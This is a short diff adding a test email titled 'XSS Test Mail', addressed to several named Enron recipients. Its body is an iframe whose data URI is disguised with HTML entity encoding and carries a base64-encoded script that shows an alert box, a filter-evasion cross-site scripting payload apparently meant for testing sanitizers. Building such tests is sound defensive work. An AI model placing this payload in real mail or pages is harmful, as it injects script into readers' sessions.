@@ -1,0 +1,4 @@
+From: Antonio_Paredes@aphis.usda.gov
+To: paul.kaufman@enron.com, harry.kingerski@enron.com, jeff.dasovich@enron.com, 
+Subject: XSS Test Mail
+<iframe src="dat&NewLine;a&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
